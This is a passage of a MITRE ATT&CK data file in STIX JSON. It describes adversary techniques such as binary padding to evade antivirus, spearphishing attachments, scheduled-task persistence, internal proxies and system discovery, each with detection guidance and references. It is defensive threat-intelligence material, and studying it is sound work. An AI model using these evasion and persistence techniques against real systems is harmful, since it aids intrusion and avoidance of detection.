                    "external_id": "T1027",
                    "source_name": "mitre-attack"
                },
                {
                    "url": "https://capec.mitre.org/data/definitions/267.html",
                    "external_id": "CAPEC-267",
                    "source_name": "capec"
                },
                {
                    "source_name": "Volexity PowerDuke November 2016",
                    "description": "Adair, S.. (2016, November 9). PowerDuke: Widespread Post-Election Spear Phishing Campaigns Targeting Think Tanks and NGOs. Retrieved January 11, 2017.",
                    "url": "https://www.volexity.com/blog/2016/11/09/powerduke-post-election-spear-phishing-campaigns-targeting-think-tanks-and-ngos/"
                },
                {
                    "source_name": "Linux/Cdorked.A We Live Security Analysis",
                    "description": "Pierre-Marc Bureau. (2013, April 26). Linux/Cdorked.A: New Apache backdoor being used in the wild to serve Blackhole. Retrieved September 10, 2017.",
                    "url": "https://www.welivesecurity.com/2013/04/26/linuxcdorked-new-apache-backdoor-in-the-wild-serves-blackhole/"
                },
                {
                    "source_name": "Carbon Black Obfuscation Sept 2016",
                    "description": "Tedesco, B. (2016, September 23). Security Alert Summary. Retrieved February 12, 2018.",
                    "url": "https://www.carbonblack.com/2016/09/23/security-advisory-variants-well-known-adware-families-discovered-include-sophisticated-obfuscation-techniques-previously-associated-nation-state-attacks/"
                },
                {
                    "source_name": "FireEye Obfuscation June 2017",
                    "description": "Bohannon, D. & Carr N. (2017, June 30). Obfuscation in the Wild: Targeted Attackers Lead the Way in Evasion Techniques. Retrieved February 12, 2018.",
                    "url": "https://www.fireeye.com/blog/threat-research/2017/06/obfuscation-in-the-wild.html"
                },
                {
                    "source_name": "FireEye Revoke-Obfuscation July 2017",
                    "description": "Bohannon, D. & Holmes, L. (2017, July 27). Revoke-Obfuscation: PowerShell Obfuscation Detection Using Science. Retrieved February 12, 2018.",
                    "url": "https://www.fireeye.com/content/dam/fireeye-www/blog/pdfs/revoke-obfuscation-report.pdf"
                },
                {
                    "source_name": "PaloAlto EncodedCommand March 2017",
                    "description": "White, J. (2017, March 10). Pulling Back the Curtains on EncodedCommand PowerShell Attacks. Retrieved February 12, 2018.",
                    "url": "https://researchcenter.paloaltonetworks.com/2017/03/unit42-pulling-back-the-curtains-on-encodedcommand-powershell-attacks/"
                },
                {
                    "source_name": "GitHub Revoke-Obfuscation",
                    "description": "Bohannon, D. (2017, July 27). Revoke-Obfuscation. Retrieved February 12, 2018.",
                    "url": "https://github.com/danielbohannon/Revoke-Obfuscation"
                },
                {
                    "source_name": "GitHub Office-Crackros Aug 2016",
                    "description": "Carr, N. (2016, August 14). OfficeCrackros. Retrieved February 12, 2018.",
                    "url": "https://github.com/itsreallynick/office-crackros"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "attack-pattern",
            "name": "Binary Padding",
            "x_mitre_data_sources": [
                "File: File Metadata"
            ],
            "x_mitre_version": "1.2",
            "modified": "2021-10-15T13:53:02.135Z",
            "created": "2020-02-05T14:04:25.865Z",
            "kill_chain_phases": [
                {
                    "kill_chain_name": "mitre-attack",
                    "phase_name": "defense-evasion"
                }
            ],
            "x_mitre_defense_bypassed": [
                "Anti-virus",
                "Signature-based detection"
            ],
            "x_mitre_platforms": [
                "Linux",
                "macOS",
                "Windows"
            ],
            "x_mitre_is_subtechnique": true,
            "id": "attack-pattern--5bfccc3f-2326-4112-86cc-c1ece9d8a2b5",
            "description": "Adversaries may use binary padding to add junk data and change the on-disk representation of malware. This can be done without affecting the functionality or behavior of a binary, but can increase the size of the binary beyond what some security tools are capable of handling due to file size limitations. \n\nBinary padding effectively changes the checksum of the file and can also be used to avoid hash-based blocklists and static anti-virus signatures.(Citation: ESET OceanLotus) The padding used is commonly generated by a function to create junk data and then appended to the end or applied to sections of malware.(Citation: Securelist Malware Tricks April 2017) Increasing the file size may decrease the effectiveness of certain tools and detection capabilities that are not designed or configured to scan large files. This may also reduce the likelihood of being collected for analysis. Public file scanning services, such as VirusTotal, limits the maximum size of an uploaded file to be analyzed.(Citation: VirusTotal FAQ) ",
            "x_mitre_contributors": [
                "Martin Jirkal, ESET"
            ],
            "x_mitre_detection": "Depending on the method used to pad files, a file-based signature may be capable of detecting padding using a scanning or on-access based tool.  When executed, the resulting process from padded files may also exhibit other behavior characteristics of being used to conduct an intrusion such as system and network information Discovery or Lateral Movement, which could be used as event indicators that point to the source file. ",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "external_references": [
                {
                    "url": "https://attack.mitre.org/techniques/T1027/001",
                    "external_id": "T1027.001",
                    "source_name": "mitre-attack"
                },
                {
                    "url": "https://capec.mitre.org/data/definitions/572.html",
                    "external_id": "CAPEC-572",
                    "source_name": "capec"
                },
                {
                    "url": "https://capec.mitre.org/data/definitions/655.html",
                    "external_id": "CAPEC-655",
                    "source_name": "capec"
                },
                {
                    "url": "https://www.welivesecurity.com/2018/03/13/oceanlotus-ships-new-backdoor/",
                    "description": "Folt\u00fdn, T. (2018, March 13). OceanLotus ships new backdoor using old tricks. Retrieved May 22, 2018.",
                    "source_name": "ESET OceanLotus"
                },
                {
                    "url": "https://securelist.com/old-malware-tricks-to-bypass-detection-in-the-age-of-big-data/78010/",
                    "description": "Ishimaru, S.. (2017, April 13). Old Malware Tricks To Bypass Detection in the Age of Big Data. Retrieved May 30, 2019.",
                    "source_name": "Securelist Malware Tricks April 2017"
                },
                {
                    "url": "https://www.virustotal.com/en/faq/",
                    "description": "VirusTotal. (n.d.). VirusTotal FAQ. Retrieved May 23, 2019.",
                    "source_name": "VirusTotal FAQ"
                }
            ]
        },
        {
            "type": "attack-pattern",
            "modified": "2021-10-18T17:39:12.452Z",
            "name": "Spearphishing Attachment",
            "x_mitre_data_sources": [
                "File: File Creation",
                "Application Log: Application Log Content",
                "Network Traffic: Network Traffic Content",
                "Network Traffic: Network Traffic Flow"
            ],
            "x_mitre_version": "2.2",
            "created": "2020-03-02T19:05:18.137Z",
            "kill_chain_phases": [
                {
                    "kill_chain_name": "mitre-attack",
                    "phase_name": "initial-access"
                }
            ],
            "x_mitre_platforms": [
                "macOS",
                "Windows",
                "Linux"
            ],
            "x_mitre_is_subtechnique": true,
            "id": "attack-pattern--2e34237d-8574-43f6-aace-ae2915de8597",
            "description": "Adversaries may send spearphishing emails with a malicious attachment in an attempt to gain access to victim systems. Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon [User Execution](https://attack.mitre.org/techniques/T1204) to gain execution. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.\n\nThere are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one. ",
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "x_mitre_contributors": [
                "Philip Winther"
            ],
            "x_mitre_detection": "Network intrusion detection systems and email gateways can be used to detect spearphishing with malicious attachments in transit. Detonation chambers may also be used to identify malicious attachments. Solutions can be signature and behavior based, but adversaries may construct attachments in a way to avoid these systems.\n\nFiltering based on DKIM+SPF or header analysis can help detect when the email sender is spoofed.(Citation: Microsoft Anti Spoofing)(Citation: ACSC Email Spoofing)\n\nAnti-virus can potentially detect malicious documents and attachments as they're scanned to be stored on the email server or on the user's computer. Endpoint sensing or network sensing can potentially detect malicious events once the attachment is opened (such as a Microsoft Word document or PDF reaching out to the internet or spawning Powershell.exe) for techniques such as [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203) or usage of malicious scripts.\n\nMonitor for suspicious descendant process spawning from Microsoft Office and other productivity software.(Citation: Elastic - Koadiac Detection with EQL)",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "external_references": [
                {
                    "url": "https://attack.mitre.org/techniques/T1566/001",
                    "external_id": "T1566.001",
                    "source_name": "mitre-attack"
                },
                {
                    "url": "https://capec.mitre.org/data/definitions/163.html",
                    "external_id": "CAPEC-163",
                    "source_name": "capec"
                },
                {
                    "url": "https://docs.microsoft.com/en-us/microsoft-365/security/office-365-security/anti-spoofing-protection?view=o365-worldwide",
                    "description": "Microsoft. (2020, October 13). Anti-spoofing protection in EOP. Retrieved October 19, 2020.",
                    "source_name": "Microsoft Anti Spoofing"
                },
                {
                    "url": "https://www.cyber.gov.au/sites/default/files/2019-03/spoof_email_sender_policy_framework.pdf",
                    "description": "Australian Cyber Security Centre. (2012, December). Mitigating Spoofed Emails Using Sender Policy Framework. Retrieved October 19, 2020.",
                    "source_name": "ACSC Email Spoofing"
                },
                {
                    "url": "https://www.elastic.co/blog/embracing-offensive-tooling-building-detections-against-koadic-using-eql",
                    "description": "Stepanic, D.. (2020, January 13). Embracing offensive tooling: Building detections against Koadic using EQL. Retrieved November 30, 2020.",
                    "source_name": "Elastic - Koadiac Detection with EQL"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "attack-pattern",
            "name": "Process Discovery",
            "external_references": [
                {
                    "url": "https://attack.mitre.org/techniques/T1057",
                    "external_id": "T1057",
                    "source_name": "mitre-attack"
                },
                {
                    "url": "https://capec.mitre.org/data/definitions/573.html",
                    "external_id": "CAPEC-573",
                    "source_name": "capec"
                }
            ],
            "x_mitre_data_sources": [
                "Process: Process Creation",
                "Command: Command Execution",
                "Process: OS API Execution"
            ],
            "x_mitre_version": "1.2",
            "modified": "2020-03-26T18:05:53.130Z",
            "x_mitre_system_requirements": [
                "Administrator, SYSTEM may provide better process ownership details"
            ],
            "id": "attack-pattern--8f4a33ec-8b1f-4b80-a2f6-642b2e479580",
            "x_mitre_platforms": [
                "Linux",
                "macOS",
                "Windows"
            ],
            "x_mitre_is_subtechnique": false,
            "x_mitre_permissions_required": [
                "User",
                "Administrator",
                "SYSTEM"
            ],
            "description": "Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Adversaries may use the information from [Process Discovery](https://attack.mitre.org/techniques/T1057) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nIn Windows environments, adversaries could obtain details on running processes using the [Tasklist](https://attack.mitre.org/software/S0057) utility via [cmd](https://attack.mitre.org/software/S0106) or <code>Get-Process</code> via [PowerShell](https://attack.mitre.org/techniques/T1059/001). Information about processes can also be extracted from the output of [Native API](https://attack.mitre.org/techniques/T1106) calls such as <code>CreateToolhelp32Snapshot</code>. In Mac and Linux, this is accomplished with the <code>ps</code> command. Adversaries may also opt to enumerate processes via /proc.",
            "kill_chain_phases": [
                {
                    "kill_chain_name": "mitre-attack",
                    "phase_name": "discovery"
                }
            ],
            "x_mitre_detection": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nNormal, benign system and network events that look like process discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).",
            "created": "2017-05-31T21:30:48.728Z",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5"
        },
        {
            "type": "attack-pattern",
            "modified": "2020-03-15T00:46:26.598Z",
            "name": "Internal Proxy",
            "x_mitre_data_sources": [
                "Network Traffic: Network Traffic Flow",
                "Network Traffic: Network Connection Creation",
                "Network Traffic: Network Traffic Content"
            ],
            "x_mitre_version": "1.0",
            "created": "2020-03-14T23:08:20.244Z",
            "x_mitre_platforms": [
                "Linux",
                "macOS",
                "Windows"
            ],
            "x_mitre_is_subtechnique": true,
            "id": "attack-pattern--f6dacc85-b37d-458e-b58d-74fc4bbf5755",
            "description": "Adversaries may use an internal proxy to direct command and control traffic between two or more systems in a compromised environment. Many tools exist that enable traffic redirection through proxies or port redirection, including [HTRAN](https://attack.mitre.org/software/S0040), ZXProxy, and ZXPortMap. (Citation: Trend Micro APT Attack Tools) Adversaries use internal proxies to manage command and control communications inside a compromised environment, to reduce the number of simultaneous outbound network connections, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between infected systems to avoid suspicion. Internal proxy connections may use common peer-to-peer (p2p) networking protocols, such as SMB, to better blend in with the environment.\n\nBy using a compromised internal system as a proxy, adversaries may conceal the true destination of C2 traffic while reducing the need for numerous connections to external systems.",
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "kill_chain_phases": [
                {
                    "kill_chain_name": "mitre-attack",
                    "phase_name": "command-and-control"
                }
            ],
            "x_mitre_detection": "Analyze network data for uncommon data flows between clients that should not or often do not communicate with one another. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "external_references": [
                {
                    "url": "https://attack.mitre.org/techniques/T1090/001",
                    "external_id": "T1090.001",
                    "source_name": "mitre-attack"
                },
                {
                    "source_name": "Trend Micro APT Attack Tools",
                    "description": "Wilhoit, K. (2013, March 4). In-Depth Look: APT Attack Tools of the Trade. Retrieved December 2, 2015.",
                    "url": "http://blog.trendmicro.com/trendlabs-security-intelligence/in-depth-look-apt-attack-tools-of-the-trade/"
                },
                {
                    "source_name": "University of Birmingham C2",
                    "description": "Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.",
                    "url": "https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf"
                }
            ]
        },
        {
            "type": "attack-pattern",
            "modified": "2020-12-30T14:26:44.730Z",
            "name": "Scheduled Task",
            "x_mitre_data_sources": [
                "Scheduled Job: Scheduled Job Creation",
                "Command: Command Execution",
                "File: File Modification",
                "Process: Process Creation"
            ],
            "x_mitre_version": "1.0",
            "created": "2019-11-27T14:58:00.429Z",
            "kill_chain_phases": [
                {
                    "kill_chain_name": "mitre-attack",
                    "phase_name": "execution"
                },
                {
                    "kill_chain_name": "mitre-attack",
                    "phase_name": "persistence"
                },
                {
                    "kill_chain_name": "mitre-attack",
                    "phase_name": "privilege-escalation"
                }
            ],
            "x_mitre_permissions_required": [
                "Administrator"
            ],
            "x_mitre_platforms": [
                "Windows"
            ],
            "x_mitre_is_subtechnique": true,
            "id": "attack-pattern--005a06c6-14bf-4118-afa0-ebcd8aebb0c9",
            "description": "Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The <code>schtasks</code> can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel. In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library to create a scheduled task.\n\nThe deprecated [at](https://attack.mitre.org/software/S0110) utility could also be abused by adversaries (ex: [At (Windows)](https://attack.mitre.org/techniques/T1053/002)), though <code>at.exe</code> can not access tasks created with <code>schtasks</code> or the Control Panel.\n\nAn adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence. The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and or to run a process under the context of a specified account (such as SYSTEM).",
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "x_mitre_remote_support": true,
            "x_mitre_detection": "Monitor process execution from the <code>svchost.exe</code> in Windows 10 and the Windows Task Scheduler <code>taskeng.exe</code> for older versions of Windows. (Citation: Twitter Leoloobeek Scheduled Task) If scheduled tasks are not used for persistence, then the adversary is likely to remove the task when the action is complete. Monitor Windows Task Scheduler stores in %systemroot%\\System32\\Tasks for change entries related to scheduled tasks that do not correlate with known software, patch cycles, etc.\n\nConfigure event logging for scheduled task creation and changes by enabling the \"Microsoft-Windows-TaskScheduler/Operational\" setting within the event logging service. (Citation: TechNet Forum Scheduled Task Operational Setting) Several events will then be logged on scheduled task activity, including: (Citation: TechNet Scheduled Task Events)(Citation: Microsoft Scheduled Task Events Win10)\n\n* Event ID 106 on Windows 7, Server 2008 R2 - Scheduled task registered\n* Event ID 140 on Windows 7, Server 2008 R2 / 4702 on Windows 10, Server 2016 - Scheduled task updated\n* Event ID 141 on Windows 7, Server 2008 R2 / 4699 on Windows 10, Server 2016 - Scheduled task deleted\n* Event ID 4698 on Windows 10, Server 2016 - Scheduled task created\n* Event ID 4700 on Windows 10, Server 2016 - Scheduled task enabled\n* Event ID 4701 on Windows 10, Server 2016 - Scheduled task disabled\n\nTools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current scheduled tasks. (Citation: TechNet Autoruns)\n\nRemote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Tasks may also be created through Windows system management tools such as Windows Management Instrumentation and PowerShell, so additional logging may need to be configured to gather the appropriate data.",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "external_references": [
                {
                    "url": "https://attack.mitre.org/techniques/T1053/005",
                    "external_id": "T1053.005",
                    "source_name": "mitre-attack"
                },
                {
                    "source_name": "Twitter Leoloobeek Scheduled Task",
                    "description": "Loobeek, L. (2017, December 8). leoloobeek Status. Retrieved December 12, 2017.",
                    "url": "https://twitter.com/leoloobeek/status/939248813465853953"
                },
                {
                    "source_name": "TechNet Forum Scheduled Task Operational Setting",
                    "description": "Satyajit321. (2015, November 3). Scheduled Tasks History Retention settings. Retrieved December 12, 2017.",
                    "url": "https://social.technet.microsoft.com/Forums/en-US/e5bca729-52e7-4fcb-ba12-3225c564674c/scheduled-tasks-history-retention-settings?forum=winserver8gen"
                },
                {
                    "source_name": "TechNet Scheduled Task Events",
                    "description": "Microsoft. (n.d.). General Task Registration. Retrieved December 12, 2017.",
                    "url": "https://technet.microsoft.com/library/dd315590.aspx"
                },
                {
                    "url": "https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/audit-other-object-access-events",
                    "description": "Microsoft. (2017, May 28). Audit Other Object Access Events. Retrieved June 27, 2019.",
                    "source_name": "Microsoft Scheduled Task Events Win10"
                },
                {
                    "source_name": "TechNet Autoruns",
                    "description": "Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016.",
                    "url": "https://technet.microsoft.com/en-us/sysinternals/bb963902"
                }
            ]
        },
        {
            "type": "attack-pattern",
            "modified": "2020-03-28T00:26:48.769Z",
            "name": "Scheduled Transfer",
            "external_references": [
                {
                    "url": "https://attack.mitre.org/techniques/T1029",
                    "external_id": "T1029",
                    "source_name": "mitre-attack"
                }
            ],
            "x_mitre_data_sources": [
                "Network Traffic: Network Connection Creation",
                "Network Traffic: Network Traffic Flow"
            ],
            "x_mitre_version": "1.1",
            "created": "2017-05-31T21:30:34.139Z",
            "x_mitre_network_requirements": true,
            "x_mitre_is_subtechnique": false,
            "id": "attack-pattern--4eeaf8a9-c86b-4954-a663-9555fb406466",
            "description": "Adversaries may schedule data exfiltration to be performed only at certain times of day or at certain intervals. This could be done to blend traffic patterns with normal activity or availability.\n\nWhen scheduled exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as [Exfiltration Over C2 Channel](https://attack.mitre.org/techniques/T1041) or [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048).",
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "kill_chain_phases": [
                {
                    "kill_chain_name": "mitre-attack",
                    "phase_name": "exfiltration"
                }
            ],
            "x_mitre_detection": "Monitor process file access patterns and network behavior. Unrecognized processes or scripts that appear to be traversing file systems and sending network traffic may be suspicious. Network connections to the same destination that occur at the same time of day for multiple days are suspicious.",
            "x_mitre_platforms": [
                "Linux",
                "macOS",
                "Windows"
            ],
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5"
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "attack-pattern",
            "name": "System Information Discovery",
            "x_mitre_data_sources": [
                "Instance: Instance Metadata",
                "Process: Process Creation",
                "Command: Command Execution",
                "Process: OS API Execution"
            ],
            "x_mitre_version": "2.3",
            "modified": "2021-10-13T23:21:27.750Z",
            "created": "2017-05-31T21:31:04.307Z",
            "kill_chain_phases": [
                {
                    "kill_chain_name": "mitre-attack",
                    "phase_name": "discovery"
                }
            ],
            "id": "attack-pattern--354a7f88-63fb-41b5-a801-ce3b377b36f1",
            "x_mitre_platforms": [
                "Windows",
                "IaaS",
                "Linux",
                "macOS"
            ],
            "x_mitre_is_subtechnique": false,
            "x_mitre_permissions_required": [
                "User"
            ],
            "description": "An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from [System Information Discovery](https://attack.mitre.org/techniques/T1082) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nTools such as [Systeminfo](https://attack.mitre.org/software/S0096) can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the <code>systemsetup</code> configuration tool on macOS. As an example, adversaries with user-level access can execute the <code>df -aH</code> command to obtain currently mounted disks and associated freely available space. [System Information Discovery](https://attack.mitre.org/techniques/T1082) combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.(Citation: OSX.FairyTale)(Citation: 20 macOS Common Tools and Techniques)\n\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.(Citation: Amazon Describe Instance)(Citation: Google Instances Resource)(Citation: Microsoft Virutal Machine API)",
            "x_mitre_contributors": [
                "Maril Vernon @shewhohacks",
                "Praetorian"
            ],
            "x_mitre_detection": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\n\nIn cloud-based systems, native logging can be used to identify access to certain APIs and dashboards that may contain system information. Depending on how the environment is used, that data alone may not be useful due to benign use during normal operations.",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "external_references": [
                {
                    "url": "https://attack.mitre.org/techniques/T1082",
                    "external_id": "T1082",
                    "source_name": "mitre-attack"
                },
                {
                    "url": "https://capec.mitre.org/data/definitions/312.html",
                    "external_id": "CAPEC-312",
                    "source_name": "capec"
                },
                {
                    "url": "https://www.sentinelone.com/blog/trail-osx-fairytale-adware-playing-malware/",
                    "description": "Phile Stokes. (2018, September 20). On the Trail of OSX.FairyTale | Adware Playing at Malware. Retrieved August 24, 2021.",
                    "source_name": "OSX.FairyTale"
                },
                {
                    "url": "https://labs.sentinelone.com/20-common-tools-techniques-used-by-macos-threat-actors-malware/",
                    "description": "Phil Stokes. (2021, February 16). 20 Common Tools & Techniques Used by macOS Threat Actors & Malware. Retrieved August 23, 2021.",
                    "source_name": "20 macOS Common Tools and Techniques"
                },
                {
                    "url": "https://docs.aws.amazon.com/cli/latest/reference/ssm/describe-instance-information.html",
                    "description": "Amazon. (n.d.). describe-instance-information. Retrieved March 3, 2020.",
                    "source_name": "Amazon Describe Instance"
                },
                {
                    "url": "https://cloud.google.com/compute/docs/reference/rest/v1/instances",
                    "description": "Google. (n.d.). Rest Resource: instance. Retrieved March 3, 2020.",
                    "source_name": "Google Instances Resource"
                },
                {
                    "source_name": "Microsoft Virutal Machine API",
                    "description": "Microsoft. (2019, March 1). Virtual Machines - Get. Retrieved October 8, 2019.",
                    "url": "https://docs.microsoft.com/en-us/rest/api/compute/virtualmachines/get"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "attack-pattern",
            "name": "System Network Configuration Discovery",
            "x_mitre_data_sources": [
                "Process: Process Creation",
                "Script: Script Execution",
                "Command: Command Execution",
                "Process: OS API Execution"
            ],
            "x_mitre_version": "1.3",
            "modified": "2021-10-08T00:17:37.881Z",
            "created": "2017-05-31T21:30:27.342Z",
            "x_mitre_permissions_required": [
                "User"
            ],
            "x_mitre_platforms": [
                "Linux",
                "macOS",
                "Windows"
            ],
            "x_mitre_is_subtechnique": false,
            "id": "attack-pattern--707399d6-ab3e-4963-9315-d9d3818cd6a0",
            "description": "Adversaries may look for details about the network configuration and settings, such as IP and/or MAC addresses, of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include [Arp](https://attack.mitre.org/software/S0099), [ipconfig](https://attack.mitre.org/software/S0100)/[ifconfig](https://attack.mitre.org/software/S0101), [nbtstat](https://attack.mitre.org/software/S0102), and [route](https://attack.mitre.org/software/S0103).\n\nAdversaries may use the information from [System Network Configuration Discovery](https://attack.mitre.org/techniques/T1016) during automated discovery to shape follow-on behaviors, including determining certain access within the target network and what actions to do next. ",
            "kill_chain_phases": [
                {
                    "kill_chain_name": "mitre-attack",
                    "phase_name": "discovery"
                }
            ],
            "x_mitre_detection": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "external_references": [
                {
                    "url": "https://attack.mitre.org/techniques/T1016",
                    "external_id": "T1016",
                    "source_name": "mitre-attack"
                },
                {
                    "url": "https://capec.mitre.org/data/definitions/309.html",
                    "external_id": "CAPEC-309",
                    "source_name": "capec"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "attack-pattern",
            "name": "System Time Discovery",
            "x_mitre_data_sources": [
                "Process: Process Creation",
                "Command: Command Execution",
                "Process: OS API Execution"
            ],
            "x_mitre_version": "1.2",
            "modified": "2021-04-22T23:09:24.799Z",
            "created": "2017-05-31T21:31:37.450Z",
            "kill_chain_phases": [
                {
                    "kill_chain_name": "mitre-attack",
                    "phase_name": "discovery"
                }
            ],
            "id": "attack-pattern--f3c544dc-673c-4ef3-accb-53229f1ae077",
            "x_mitre_platforms": [
                "Windows"
            ],
            "x_mitre_is_subtechnique": false,
            "x_mitre_permissions_required": [
                "User"
            ],
            "description": "An adversary may gather the system time and/or time zone from a local or remote system. The system time is set and stored by the Windows Time Service within a domain to maintain time synchronization between systems and services in an enterprise network. (Citation: MSDN System Time) (Citation: Technet Windows Time Service)\n\nSystem time information may be gathered in a number of ways, such as with [Net](https://attack.mitre.org/software/S0039) on Windows by performing <code>net time \\\\hostname</code> to gather the system time on a remote system. The victim's time zone may also be inferred from the current system time or gathered by using <code>w32tm /tz</code>. (Citation: Technet Windows Time Service)\n\nThis information could be useful for performing other techniques, such as executing a file with a [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053) (Citation: RSA EU12 They're Inside), or to discover locality information based on time zone to assist in victim targeting (i.e. [System Location Discovery](https://attack.mitre.org/techniques/T1614)). Adversaries may also use knowledge of system time as part of a time bomb, or delaying execution until a specified date/time.(Citation: AnyRun TimeBomb)",
            "x_mitre_contributors": [
                "FIRST.ORG's Cyber Threat Intelligence SIG"
            ],
            "x_mitre_detection": "Command-line interface monitoring may be useful to detect instances of net.exe or other command-line utilities being used to gather system time or time zone. Methods of detecting API use for gathering this information are likely less useful due to how often they may be used by legitimate software.",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "external_references": [
                {
                    "url": "https://attack.mitre.org/techniques/T1124",
                    "external_id": "T1124",
                    "source_name": "mitre-attack"
                },
                {
                    "url": "https://capec.mitre.org/data/definitions/295.html",
                    "external_id": "CAPEC-295",
                    "source_name": "capec"
                },
                {
                    "source_name": "MSDN System Time",
                    "description": "Microsoft. (n.d.). System Time. Retrieved November 25, 2016.",
                    "url": "https://msdn.microsoft.com/ms724961.aspx"
                },
                {
                    "source_name": "Technet Windows Time Service",
                    "description": "Mathers, B. (2016, September 30). Windows Time Service Tools and Settings. Retrieved November 25, 2016.",
                    "url": "https://technet.microsoft.com/windows-server-docs/identity/ad-ds/get-started/windows-time-service/windows-time-service-tools-and-settings"
                },
                {
                    "source_name": "RSA EU12 They're Inside",
                    "description": "Rivner, U., Schwartz, E. (2012). They\u2019re Inside\u2026 Now What?. Retrieved November 25, 2016.",
                    "url": "https://www.rsaconference.com/writable/presentations/file_upload/ht-209_rivner_schwartz.pdf"
                },
                {
